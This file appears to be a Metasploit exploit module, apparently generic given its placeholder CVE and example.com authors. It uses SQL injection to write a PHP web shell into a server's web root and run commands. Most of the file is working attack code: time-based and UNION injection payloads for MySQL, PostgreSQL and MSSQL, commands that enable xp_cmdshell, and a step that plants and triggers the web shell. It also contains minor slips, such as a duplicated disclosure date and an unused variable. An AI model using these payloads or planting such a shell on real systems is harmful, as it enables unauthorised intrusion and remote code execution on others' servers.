##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Web Application SQL Injection to Remote Code Execution',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in a web application
          to achieve remote code execution. The vulnerability exists in a parameter
          that is not properly sanitized before being used in SQL queries.
          
          The module first detects the database type (MySQL, PostgreSQL, or MSSQL),
          then uses database-specific syntax to write a payload to the filesystem
          using techniques such as INTO OUTFILE, COPY TO, or xp_cmdshell. Finally,
          it triggers execution of the payload through the web server or database
          command execution capabilities.
          
          This technique requires the database user to have sufficient privileges
          for file operations or command execution.
        },
        'Author' => [
          'John Security <john[at]example.com>',
          'Jane Researcher'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-12345'],
          ['OSVDB', '98765'],
          ['URL', 'https://example.com/advisory/sql-injection-rce']
        ],
        'DisclosureDate' => '2024-01-15',
        'Platform' => ['win', 'linux'],
        'Targets' => [
          [
            'MySQL 5.x/8.x - INTO OUTFILE',
            {
              'DBType' => 'mysql',
              'Technique' => 'outfile',
              'WebRoot' => '/var/www/html',
              'Platform' => 'linux',
              'Arch' => ARCH_X64
            }
          ],
          [
            'PostgreSQL 9.x+ - COPY TO',
            {
              'DBType' => 'postgresql',
              'Technique' => 'copy',
              'WebRoot' => '/var/www/html',
              'Platform' => 'linux',
              'Arch' => ARCH_X64
            }
          ],
          [
            'MSSQL - xp_cmdshell',
            {
              'DBType' => 'mssql',
              'Technique' => 'cmdshell',
              'WebRoot' => 'C:\\inetpub\\wwwroot',
              'Platform' => 'win',
              'Arch' => ARCH_X64
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2024-01-15'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the vulnerable page', '/search.php']),
        OptString.new('SQLI_PARAM', [true, 'The vulnerable parameter name', 'id']),
        OptString.new('DB_USER', [false, 'Database username for authentication bypass', '']),
        OptString.new('DB_PASS', [false, 'Database password', '']),
        OptString.new('PAYLOAD_NAME', [false, 'Name for the payload file', ''])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('SQL_TIMEOUT', [true, 'Timeout for SQL injection tests', 10]),
        OptBool.new('BLIND_SQLI', [true, 'Use blind SQL injection techniques', false])
      ]
    )
  end

  def check
    vprint_status('Testing for SQL injection vulnerability...')
    
    # Test for time-based blind SQL injection
    begin
      baseline_time = test_injection('1', false)
      
      # Test with sleep payload based on detected database
      db_type = detect_database
      
      case db_type
      when 'mysql'
        sleep_payload = "1' AND SLEEP(5)-- -"
      when 'postgresql'
        sleep_payload = "1' AND pg_sleep(5)-- -"
      when 'mssql'
        sleep_payload = "1'; WAITFOR DELAY '00:00:05'-- -"
      else
        return CheckCode::Unknown
      end
      
      sleep_time = test_injection(sleep_payload, true)
      
      if sleep_time >= 5
        vprint_good("SQL injection confirmed (time delay: #{sleep_time}s)")
        
        # Verify we can extract data
        if extract_data('SELECT 1').include?('1')
          return CheckCode::Vulnerable
        else
          return CheckCode::Appears
        end
      else
        return CheckCode::Safe
      end
      
    rescue ::Rex::ConnectionError, ::Timeout::Error => e
      vprint_error("Connection error during check: #{e.message}")
      return CheckCode::Unknown
    end
  end

  def exploit
    print_status("Attempting SQL injection exploitation against #{target.name}")
    
    # Detect database type if not specified by target
    db_type = target['DBType']
    print_status("Target database type: #{db_type}")
    
    # Generate payload filename
    @payload_name = datastore['PAYLOAD_NAME']
    if @payload_name.empty?
      @payload_name = Rex::Text.rand_text_alpha(8) + '.php'
    end
    
    # Build the payload content
    payload_content = build_payload_content
    
    # Write payload to disk using database-specific technique
    print_status("Writing payload to disk: #{@payload_name}")
    unless write_payload_to_disk(payload_content, db_type)
      fail_with(Failure::Unknown, 'Failed to write payload to disk')
    end
    
    print_good('Payload written successfully')
    
    # Trigger payload execution
    print_status('Triggering payload execution...')
    trigger_payload
  end

  private

  def detect_database
    print_status('Detecting database type...')
    
    # Test MySQL
    mysql_test = "1' AND @@version LIKE '%'-- -"
    if test_injection(mysql_test, false, true)
      print_good('Detected MySQL database')
      return 'mysql'
    end
    
    # Test PostgreSQL
    pgsql_test = "1' AND version() LIKE '%PostgreSQL%'-- -"
    if test_injection(pgsql_test, false, true)
      print_good('Detected PostgreSQL database')
      return 'postgresql'
    end
    
    # Test MSSQL
    mssql_test = "1' AND @@version LIKE '%Microsoft%'-- -"
    if test_injection(mssql_test, false, true)
      print_good('Detected MSSQL database')
      return 'mssql'
    end
    
    print_warning('Could not detect database type, using target specification')
    return target['DBType']
  end

  def test_injection(payload, expect_delay = false, check_response = false)
    encoded_payload = Rex::Text.uri_encode(payload)
    
    start_time = Time.now
    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => encoded_payload
      }
    })
    
    elapsed = Time.now - start_time
    
    return elapsed if expect_delay
    return (res && res.code == 200 && res.body.length > 0) if check_response
    
    elapsed
  rescue ::Rex::ConnectionError, ::Timeout::Error => e
    vprint_error("Connection error: #{e.message}")
    return 0
  end

  def extract_data(query)
    print_status("Extracting data: #{query}")
    
    # Use UNION-based injection to extract data
    union_payload = "1' UNION SELECT #{query}-- -"
    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => union_payload
      }
    })
    
    if res && res.code == 200
      return res.body
    end
    
    ''
  rescue ::Rex::ConnectionError => e
    vprint_error("Extraction failed: #{e.message}")
    ''
  end

  def build_payload_content
    # Generate PHP payload for code execution
    php_payload = %Q{<?php system($_GET['cmd']); ?>}
    
    # For more complex payloads, integrate with Metasploit payload system
    if payload.arch.include?(ARCH_X64) && target['Platform'] == 'linux'
      return php_payload
    elsif target['Platform'] == 'win'
      return php_payload
    end
    
    php_payload
  end

  def write_payload_to_disk(content, db_type)
    web_root = target['WebRoot']
    file_path = "#{web_root}/#{@payload_name}"
    
    case db_type
    when 'mysql'
      return write_mysql_outfile(content, file_path)
    when 'postgresql'
      return write_postgresql_copy(content, file_path)
    when 'mssql'
      return write_mssql_xpcmdshell(content, file_path)
    end
    
    false
  end

  def write_mysql_outfile(content, file_path)
    # Encode content for SQL
    hex_content = Rex::Text.to_hex(content, '0x')
    
    # Use INTO OUTFILE to write payload
    injection = "1' UNION SELECT #{hex_content} INTO OUTFILE '#{file_path}'-- -"
    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => injection
      }
    })
    
    res && res.code == 200
  end

  def write_postgresql_copy(content, file_path)
    # PostgreSQL COPY TO requires stacked queries
    hex_content = Rex::Text.to_hex(content, '\\x')
    
    injection = "1'; COPY (SELECT '#{content}') TO '#{file_path}'-- -"
    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => injection
      }
    })
    
    res && res.code == 200
  end

  def write_mssql_xpcmdshell(content, file_path)
    # Enable xp_cmdshell if needed
    enable_cmd = "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -"
    
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => enable_cmd
      }
    })
    
    # Write file using echo command
    escaped_content = content.gsub("'", "''")
    write_cmd = "1'; EXEC xp_cmdshell 'echo #{escaped_content} > #{file_path}'-- -"
    
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['SQLI_PARAM'] => write_cmd
      }
    })
    
    res && res.code == 200
  end

  def trigger_payload
    # Request the payload file to trigger execution
    payload_uri = normalize_uri(target_uri.path.split('/')[0..-2].join('/'), @payload_name)
    
    print_status("Requesting payload at: #{payload_uri}")
    
    res = send_request_cgi({
      'uri' => payload_uri,
      'method' => 'GET',
      'vars_get' => {
        'cmd' => 'id'
      }
    })
    
    if res && res.code == 200
      print_good('Payload executed successfully')
      print_line(res.body)
      return true
    else
      print_error('Failed to trigger payload')
      return false
    end
  end
end